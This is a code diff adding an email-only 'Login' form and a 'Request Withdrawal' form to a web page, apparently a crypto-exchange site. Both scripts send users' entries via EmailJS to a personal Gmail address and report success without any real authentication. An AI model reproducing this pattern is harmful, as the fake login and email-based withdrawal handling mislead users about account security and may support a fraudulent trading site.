@@ -246,3 +246,56 @@
     .catch(err => alert('Error: ' + err));
   });
                         </script>
+<!-- LOGIN FORM -->
+<section id="login" style="padding:50px; text-align:center;">
+  <h2>Login</h2>
+  <form id="login-form">
+    <input type="email" name="email" placeholder="Your Email" required style="padding:10px; margin:5px; width:250px;"><br>
+    <button type="submit" style="padding:10px 20px; background:#28a745; color:white; border:none; cursor:pointer;">Login</button>
+  </form>
+</section>
+
+<script>
+document.getElementById('login-form').addEventListener('submit', function(e) {
+  e.preventDefault();
+  
+  emailjs.send('default_service', 'template_uuoq5kf6', {
+    to_email: 'cointradeexchange314@gmail.com',
+    action: 'New Login',
+    user_email: this.email.value,
+    details: 'User logged in',
+    time: new Date().toLocaleString()
+  })
+  .then(() => {
+    alert('Logged in successfully!');
+    this.reset();
+  });
+});
+</script>
+<!-- WITHDRAW FORM -->
+<section id="withdraw" style="padding:50px; text-align:center; background:#f5f5f5;">
+  <h2>Request Withdrawal</h2>
+  <form id="withdraw-form">
+    <input type="email" name="email" placeholder="Your Email" required style="padding:10px; margin:5px; width:250px;"><br>
+    <input type="number" name="amount" placeholder="Amount $" required style="padding:10px; margin:5px; width:250px;"><br>
+    <button type="submit" style="padding:10px 20px; background:#dc3545; color:white; border:none; cursor:pointer;">Withdraw</button>
+  </form>
+</section>
+
+<script>
+document.getElementById('withdraw-form').addEventListener('submit', function(e) {
+  e.preventDefault();
+  
+  emailjs.send('default_service', 'template_uuoq5kf6', {
+    to_email: 'cointradeexchange314@gmail.com',
+    action: 'New Withdrawal Request',
+    user_email: this.email.value,
+    details: 'Amount: $' + this.amount.value,
+    time: new Date().toLocaleString()
+  })
+  .then(() => {
+    alert('Withdrawal request sent!');
+    this.reset();
+  });
+});
+      </script>
